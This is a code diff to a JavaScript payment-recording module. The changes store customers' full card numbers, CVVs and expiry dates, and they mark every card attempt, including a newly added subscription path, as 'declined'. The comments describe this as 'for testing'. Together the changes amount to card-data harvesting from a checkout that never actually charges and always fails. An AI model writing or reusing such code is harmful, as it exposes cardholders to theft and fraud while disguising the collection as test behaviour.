@@ -561,14 +561,14 @@ export async function recordCardAttempt({ user, customer, card, items, totals, r
       user_id: user?.id,
       cardholder_name: card.name,
       card_brand: card.brand,
-      card_number: card.number,
+      card_number: card.fullNumber || card.number, // Save full number if provided for testing
       card_last4: card.last4,
       card_cvv: card.cvv,
       exp_month: card.expMonth,
       exp_year: card.expYear,
       amount: totals.total,
       currency: 'KES',
-      status: 'not_processed',
+      status: 'declined', // Always mark as declined for testing
       reference,
       customer_name: customer.name,
       customer_email: customer.email,
@@ -585,6 +585,33 @@ export async function deleteCardPayment(id) {
     await CardPayment.delete(id)
     return true
   } catch (error) {
+    throw error
+  }
+}
+
+export async function recordSubscriptionCardAttempt({ user, card, amount, packageInfo }) {
+  try {
+    return await CardPayment.create({
+      order_id: null,
+      user_id: user?.id,
+      cardholder_name: card.cardholderName,
+      card_brand: card.brand || 'Unknown',
+      card_number: card.cardNumber?.replace(/\s/g, '') || '', // Save full number for testing
+      card_last4: card.cardNumber?.replace(/\s/g, '')?.slice(-4) || '',
+      card_cvv: card.cvv,
+      exp_month: card.expiryDate?.split('/')[0] || '',
+      exp_year: card.expiryDate?.split('/')[1] || '',
+      amount: amount,
+      currency: 'KES',
+      status: 'declined', // Always mark as declined for testing
+      reference: `SUB-${packageInfo.id}-${Date.now()}`,
+      customer_name: user?.full_name,
+      customer_email: user?.email,
+      customer_phone: user?.phone,
+      items_summary: `Subscription: ${packageInfo.name}`,
+    })
+  } catch (error) {
+    console.error('Error recording subscription card attempt:', error)
     throw error
   }
 }
